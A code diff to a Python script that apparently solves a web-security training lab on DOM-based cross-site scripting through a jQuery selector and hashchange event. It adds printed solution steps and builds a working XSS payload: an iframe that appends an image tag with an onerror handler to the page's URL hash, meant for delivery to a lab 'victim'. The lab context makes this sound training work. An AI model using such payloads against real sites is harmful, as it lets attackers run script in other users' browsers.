@@ -1,11 +1,15 @@
 import requests
 import urllib3
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "DOM XSS in jQuery selector sink using a hashchange event"
 
 def run(url, payload, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Craft an iframe that, when loaded, will append an img element to the hash part of the URL\n2. Deliver the exploit to the victim\n3. The print() function will be called after they trigger the exploit\n""")
+
     response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
     url = url.rstrip('/')
     payload = f"""<iframe src="{url}/#" onload="this.src+='<img src=1 onerror=print()>'">"""
